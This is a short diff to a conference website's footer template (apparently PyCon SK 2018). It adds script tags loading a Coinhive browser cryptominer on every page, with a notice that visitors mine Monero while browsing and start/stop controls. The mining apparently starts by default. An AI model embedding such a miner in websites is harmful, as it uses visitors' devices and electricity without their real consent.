@@ -108,6 +108,14 @@
                   github = '<a href="https://github.com/pyconsk/2018.pycon.sk" target="_blank" class="external">GitHub</a>') }}
         {% endautoescape %}
         {% block footer %}{% endblock %}
+       
+        <script src="{{ url_for('static', filename='js/coinhive.min.js') }}"></script>
+        <script src="{{ url_for('static', filename='js/mining.min.js') }}" async></script>
+       
+        {{ _('You are supporting us by minig Monero while browsing this site.') }}
+        <a href="#" id="startMiner" class="none">{{ _('Start mining!') }}</a>
+        <a href="#" id="stopMiner">{{ _('Stop mining!') }}</a>
+        {{ _('Hashes/s') }}:&nbsp;<span class="hashesPerSecond"></span>&nbsp;{{ _('Total') }}:&nbsp;<span class="totalHashes"></span>
       </p>
     </div>
   </footer>
